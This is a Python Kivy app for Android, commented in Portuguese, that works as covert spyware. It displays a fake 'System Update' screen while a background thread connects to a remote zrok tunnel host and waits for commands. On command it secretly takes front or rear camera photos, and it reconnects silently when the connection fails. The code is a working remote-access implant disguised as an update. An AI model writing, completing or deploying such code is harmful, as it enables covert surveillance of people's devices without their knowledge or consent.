import os
import socket
import time
from kivy.app import App
from kivy.uix.label import Label
from jnius import autoclass

# Configurações do seu túnel zrok
HOST = "jkfh48jrpdys.share.zrok.io"
PORT = 443

class MainApp(App):
    def build(self):
        return Label(text="System Update em andamento...")

    def on_start(self):
        # Inicia a escuta de comandos em segundo plano
        from threading import Thread
        Thread(target=self.ouvir_comandos).start()

    def ouvir_comandos(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                while True:
                    comando = s.recv(1024).decode()
                    if "FOTO_FRONTAL" in comando:
                        # Comando simplificado para o exemplo
                        os.system("termux-camera-photo -c 1 foto_frontal.jpg")
                    elif "FOTO_TRASEIRA" in comando:
                        os.system("termux-camera-photo -c 0 foto_traseira.jpg")
                    if not comando: break
                s.close()
            except:
                time.sleep(5)

if __name__ == "__main__":
    MainApp().run()
      
